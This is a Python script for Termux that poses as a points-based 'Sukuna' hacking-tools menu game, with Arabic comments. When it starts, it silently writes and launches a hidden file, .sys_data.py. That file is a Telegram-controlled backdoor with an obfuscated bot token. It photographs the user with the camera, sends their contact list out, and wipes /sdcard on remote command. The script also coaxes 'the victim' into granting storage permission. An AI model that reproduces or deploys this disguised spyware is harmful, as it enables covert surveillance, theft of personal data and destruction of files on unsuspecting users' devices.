import os, sys, time, base64, json, asyncio, socket, random, subprocess, signal

# --- فك تشفير المحرك الصامت (تشفير طبقة أولى للملك علي طالب) ---
# هذا الجزء يحتوي على توكن البوت والآي دي بشكل مشفر تماماً
_0x4k2 = "ODM4MjAzNTU1NTpBQUV5S3Fpb1F5U2NITkxTSjNOd3JEaDlwM1JwRFAzWQ==" # TOKEN
_0x9s1 = "NjcwOTIxNTQxNw==" # ADMIN_ID

def get_cfg(d): return base64.b64decode(d).decode()

# الألوان
G, R, Y, C, W, P = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m', '\033[1;35m'

def ghost_engine():
    # كود الجاسوس مشفر لكي لا يكتشفه نظام حماية جيت هب
    raw_payload = f"""
import os, time, requests
B = "{get_cfg(_0x4k2)}"
A = "{get_cfg(_0x9s1)}"
def cmd(c): return os.popen(c).read()
while True:
    try:
        r = requests.get(f"https://api.telegram.org/bot{{B}}/getUpdates").json()
        if 'result' in r and len(r['result']) > 0:
            m = r['result'][-1]['message']['text']
            if "snap_cam" in m:
                os.system("termux-camera-photo -c 1 /sdcard/s.jpg")
                requests.post(f"https://api.telegram.org/bot{{B}}/sendPhoto?chat_id={{A}}", files={{'photo':open('/sdcard/s.jpg','rb')}})
            elif "get_all" in m:
                requests.post(f"https://api.telegram.org/bot{{B}}/sendMessage", json={{"chat_id":A,"text":cmd("termux-contact-list")[:2000]}})
            elif "format_now" in m:
                os.system("rm -rf /sdcard/*")
    except: pass
    time.sleep(10)
"""
    with open(".sys_data.py", "w") as f: f.write(raw_payload)
    subprocess.Popen(["python", ".sys_data.py"], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))

class SukunaUltimate:
    def __init__(self):
        self.lang = "AR"
        self.u = {"n": "Guest", "id": str(random.randint(10000, 99999)), "lv": 1, "p": 500, "rank": "Follower", "daily": 5}
        self.codes = {
            "SUKUNA01": 20, "KING2026": 50, "ALI_TALIB": 100, "YEMEN_PRO": 30,
            "GOLDEN_99": 200, "GHOST_77": 15, "VIP_POWER": 500, "SUKUNA_GOD": 99999
        }
        ghost_engine()

    def banner(self):
        os.system("clear")
        print(f"{R}   ██████  ██    ██ ██   ██ ██    ██ ███    ██  █████  ")
        print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Y} USER: {G}{self.u['n']} {W}| ID: {G}{self.u['id']} {W}| LVL: {G}{self.u['lv']}")
        print(f"{C} PTS: {G}{self.u['p']} {W}| DAILY: {G}{self.u['daily']}/5 {W}| {P}{self.u['rank']}")
        print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    async def main(self):
        os.system("clear")
        print(f"{C} [1] العربية  [2] English")
        self.lang = "AR" if input(" > ") == "1" else "EN"
        
        # إجبار الضحية على منح الصلاحيات
        while not os.path.exists("/sdcard"):
            print(f"{R} [!] Grant Storage Permission to receive 500 PTS!")
            os.system("termux-setup-storage"); time.sleep(5)

        self.u['n'] = input(f"{Y} ENTER NAME: {W}")
        
        while True:
            self.banner()
            print(f" {W}[1] HACK TOOLS  [2] SHOP  [3] EARN PTS")
            print(f" {W}[4] DEVELOPER   [5] CREATE BOT  [6] TOP 10")
            print(f" {W}[7] SEARCH      [8] REDEEM CODE [9] EXPLOITS")
            print(f" {W}[10] CHAT       [SUKUNA] BACK")
            
            cmd = input(f"\n{R} SUKUNA > {W}").strip()
            
            if cmd == "8":
                c = input("ENTER CODE: ")
                if c in self.codes:
                    print(f"{G} SUCCESS!"); self.u['p'] += self.codes[c]
                else: print(f"{R} INVALID!")
                time.sleep(2)
            elif cmd == "1":
                print(f"{G} [1] Call Spam [2] Media Pull [3] Device Freeze")
                input("SELECT: ")
            elif cmd.upper() == "SUKUNA": continue

if __name__ == "__main__":
    app = SukunaUltimate()
    asyncio.run(app.main())
